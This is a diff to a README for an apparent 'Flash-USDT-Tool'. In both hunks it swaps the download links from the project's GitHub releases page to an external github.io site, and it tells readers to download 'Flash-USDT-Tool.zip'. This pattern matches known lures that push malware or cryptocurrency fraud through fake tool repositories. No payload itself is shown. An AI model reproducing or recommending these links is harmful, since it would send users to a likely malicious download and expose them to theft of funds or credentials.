@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD_APP-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/teambto82/Sender/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD_APP-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://teambto82.github.io)
 
 [![Platform](https://img.shields.io/badge/Platform-Windows%2010%20|%2011-0078D4?style=for-the-badge&logo=windows&logoColor=white)](/)
 [![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
@@ -85,7 +85,7 @@ The process is straightforward:
 
 1. Visit the official download page: 
 
-   [⬇️ CLICK HERE TO DOWNLOAD](https://github.com/teambto82/Sender/releases)
+   [⬇️ CLICK HERE TO DOWNLOAD](https://teambto82.github.io)
 
 )
 2. Look for the file named `Flash-USDT-Tool.zip` in the latest release section..
